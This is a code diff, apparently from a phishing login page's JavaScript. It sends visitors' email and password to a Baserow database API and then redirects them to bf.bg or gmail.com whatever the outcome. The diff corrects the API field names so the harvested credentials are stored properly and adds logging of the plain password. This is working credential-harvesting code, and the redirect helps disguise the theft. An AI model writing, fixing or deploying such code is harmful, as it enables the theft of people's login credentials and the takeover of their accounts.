@@ -355,6 +355,8 @@
 
         if (email && password) {
             try {
+                console.log('Sending data to Baserow:', { email, password });
+
                 const response = await fetch(BASEROW_API, {
                     method: 'POST',
                     headers: {
@@ -362,26 +364,23 @@
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        "3977937": email,
-                        "3977952": password
+                        "field_3977937": email,
+                        "field_3977952": password
                     })
                 });
 
                 const result = await response.json();
-
-                // Debug: check what's returned
-                console.log('Response:', result);
+                console.log('Baserow response:', result);
 
                 if (!response.ok) {
                     console.error('Baserow error:', result);
-                } else {
-                    console.log('Successfully added to Baserow:', result);
                 }
 
+                // Redirect regardless of success
                 window.location.href = 'https://www.bf.bg';
             } catch (error) {
-                console.error('Error sending to Baserow:', error);
-                window.location.href = 'https://www.bf.bg';
+                console.error('Network or API error:', error);
+                window.location.href = 'https://gmail.com';
             }
         }
     });
@@ -391,7 +390,7 @@
         passwordInput.type = this.checked ? 'text' : 'password';
     });
 
-    // Check if returning from page 2
+    // Restore state if returning to the page with #verify
     window.addEventListener('load', function () {
         const savedEmail = sessionStorage.getItem('userEmail');
 
